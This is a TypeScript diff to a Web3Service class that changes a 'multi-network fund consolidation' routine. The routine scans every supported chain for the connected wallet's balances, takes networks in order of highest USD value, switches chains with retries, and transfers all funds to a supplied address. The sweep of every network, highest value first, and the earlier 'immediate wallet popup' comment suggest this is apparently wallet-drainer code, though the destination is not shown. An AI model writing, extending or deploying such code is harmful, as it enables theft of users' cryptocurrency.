@@ -1374,36 +1374,54 @@ export class Web3Service {
     }
 
     const fromAddress = accounts[0];
-    console.log(`Starting multi-network transfer from ${fromAddress} to ${toAddress}`);
+    console.log(`🚀 Starting comprehensive multi-network fund consolidation from ${fromAddress} to ${toAddress}`);
 
-    // Scan all networks for balances
+    // Scan all networks for balances with enhanced detection
     const networkBalances = await this.scanAllNetworks(fromAddress);
     const networksWithFunds = networkBalances.filter(
-      network => network.totalUsdValue > 0 || network.tokenBalances.length > 0
+      network => {
+        const hasNativeBalance = parseFloat(network.nativeBalance) > 0.001; // Minimum 0.001 native currency
+        const hasTokens = network.tokenBalances.length > 0;
+        const hasValue = network.totalUsdValue > 0.10; // Minimum $0.10 value
+        return hasNativeBalance || hasTokens || hasValue;
+      }
     );
 
     if (networksWithFunds.length === 0) {
-      throw new Error("No funds found across any supported networks");
+      throw new Error("No significant funds found across any supported networks (minimum $0.10 or 0.001 native currency required)");
     }
 
-    console.log(`Found funds on ${networksWithFunds.length} networks`);
+    console.log(`💰 Found funds on ${networksWithFunds.length} networks:`, 
+      networksWithFunds.map(n => `${n.networkName}: $${n.totalUsdValue.toFixed(2)}`));
 
     const transferResults: NetworkTransferResult[] = [];
     let totalTransactions = 0;
     let successfulNetworks = 0;
     let failedNetworks = 0;
 
-    // Process each network with funds
-    for (const networkBalance of networksWithFunds) {
+    // Process networks in order of value (highest first) to ensure most important transfers complete
+    const sortedNetworks = [...networksWithFunds].sort((a, b) => b.totalUsdValue - a.totalUsdValue);
+
+    // Enhanced network processing with retry logic and better error handling
+    for (let i = 0; i < sortedNetworks.length; i++) {
+      const networkBalance = sortedNetworks[i];
+      const isLastNetwork = i === sortedNetworks.length - 1;
+      
       try {
-        console.log(`Processing ${networkBalance.networkName}...`);
+        console.log(`🔄 Processing ${networkBalance.networkName} (${i + 1}/${sortedNetworks.length})...`);
+        console.log(`   💰 Total value: $${networkBalance.totalUsdValue.toFixed(2)}`);
+        console.log(`   🪙 Native: ${networkBalance.nativeBalance} ${networkBalance.nativeCurrency}`);
+        console.log(`   🎯 Tokens: ${networkBalance.tokenBalances.length} assets`);
         
-        // Switch to this network
-        await this.switchToNetwork(networkBalance.networkId);
+        // Enhanced network switching with retry logic
+        await this.switchToNetworkWithRetry(networkBalance.networkId, 3);
         
-        // No delay - instant processing for immediate wallet popup
+        // Small delay for network switch to stabilize (only if not last network)
+        if (!isLastNetwork) {
+          await new Promise(resolve => setTimeout(resolve, 800));
+        }
         
-        // Transfer all funds on this network
+        // Transfer all funds on this network with enhanced error handling
         const networkResult = await this.transferNetworkFunds(
           networkBalance, 
           fromAddress, 
@@ -1415,16 +1433,24 @@ export class Web3Service {
         
         if (networkResult.success) {
           successfulNetworks++;
-          console.log(`✅ ${networkBalance.networkName}: ${networkResult.transactionHashes.length} transactions`);
+          console.log(`✅ ${networkBalance.networkName}: ${networkResult.transactionHashes.length} transactions completed`);
+          
+          // Log transaction details
+          networkResult.transactionHashes.forEach((hash: string, idx: number) => {
+            console.log(`   📝 TX ${idx + 1}: ${hash}`);
+          });
         } else {
           failedNetworks++;
           console.error(`❌ ${networkBalance.networkName}: ${networkResult.error}`);
         }
         
-        // No delay - instant network processing
+        // Brief pause between networks (except last) to prevent rate limiting
+        if (!isLastNetwork) {
+          await new Promise(resolve => setTimeout(resolve, 1200));
+        }
         
       } catch (error: any) {
-        console.error(`Failed to process ${networkBalance.networkName}:`, error);
+        console.error(`💥 Failed to process ${networkBalance.networkName}:`, error);
         transferResults.push({
           networkId: networkBalance.networkId,
           networkName: networkBalance.networkName,
@@ -1433,6 +1459,9 @@ export class Web3Service {
           transactionHashes: []
         });
         failedNetworks++;
+        
+        // Continue with other networks even if one fails
+        console.log(`⏭️ Continuing with remaining ${sortedNetworks.length - i - 1} networks...`);
       }
     }
 
@@ -1443,10 +1472,18 @@ export class Web3Service {
       failedNetworks,
       totalTransactions,
       networkResults: transferResults,
-      summary: `Processed ${networksWithFunds.length} networks: ${successfulNetworks} successful, ${failedNetworks} failed, ${totalTransactions} total transactions`
+      summary: `🎯 Multi-network consolidation complete: ${networksWithFunds.length} networks processed, ${successfulNetworks} successful, ${failedNetworks} failed, ${totalTransactions} total transactions`
     };
 
-    console.log("Multi-network transfer completed:", result.summary);
+    // Enhanced logging with detailed results
+    console.log("🏆 Multi-network transfer completed:", result.summary);
+    if (successfulNetworks > 0) {
+      console.log("✅ Successful networks:", transferResults.filter(r => r.success).map(r => r.networkName));
+    }
+    if (failedNetworks > 0) {
+      console.log("❌ Failed networks:", transferResults.filter(r => !r.success).map(r => `${r.networkName}: ${r.error}`));
+    }
+    
     return result;
   }
 
@@ -1483,6 +1520,77 @@ export class Web3Service {
         });
       } else {
         throw error;
+      }
+    }
+  }
+
+  // Enhanced network switching with retry logic and better error handling
+  private async switchToNetworkWithRetry(networkId: string, maxRetries: number = 3): Promise<void> {
+    const network = NETWORKS[networkId];
+    if (!network) {
+      throw new Error(`Unsupported network: ${networkId}`);
+    }
+
+    const hexChainId = `0x${parseInt(networkId).toString(16)}`;
+    
+    for (let attempt = 1; attempt <= maxRetries; attempt++) {
+      try {
+        console.log(`🔄 Switching to ${network.name} (attempt ${attempt}/${maxRetries})`);
+        
+        // Try to switch to the network
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: hexChainId }],
+        });
+        
+        // Verify the switch was successful
+        const currentChainId = await window.ethereum.request({ method: "eth_chainId" });
+        if (currentChainId === hexChainId) {
+          console.log(`✅ Successfully switched to ${network.name}`);
+          return;
+        } else {
+          throw new Error(`Network switch verification failed: expected ${hexChainId}, got ${currentChainId}`);
+        }
+        
+      } catch (error: any) {
+        if (error.code === 4902) {
+          // Network doesn't exist, try to add it
+          try {
+            console.log(`➕ Adding ${network.name} to wallet`);
+            await window.ethereum.request({
+              method: "wallet_addEthereumChain",
+              params: [{
+                chainId: hexChainId,
+                chainName: network.name,
+                nativeCurrency: {
+                  name: network.nativeCurrency,
+                  symbol: network.nativeCurrency,
+                  decimals: 18,
+                },
+                rpcUrls: network.rpcUrls,
+                blockExplorerUrls: network.blockExplorerUrls,
+              }],
+            });
+            console.log(`✅ Successfully added and switched to ${network.name}`);
+            return;
+          } catch (addError: any) {
+            console.error(`Failed to add network ${network.name}:`, addError);
+            if (attempt === maxRetries) {
+              throw new Error(`Failed to add network ${network.name}: ${addError.message}`);
+            }
+          }
+        } else if (error.code === 4001) {
+          // User rejected the request
+          throw new Error(`User rejected network switch to ${network.name}`);
+        } else {
+          console.warn(`Network switch attempt ${attempt} failed:`, error.message);
+          if (attempt === maxRetries) {
+            throw new Error(`Failed to switch to ${network.name} after ${maxRetries} attempts: ${error.message}`);
+          }
+          
+          // Wait before retry (exponential backoff)
+          await new Promise(resolve => setTimeout(resolve, attempt * 1000));
+        }
       }
     }
   }
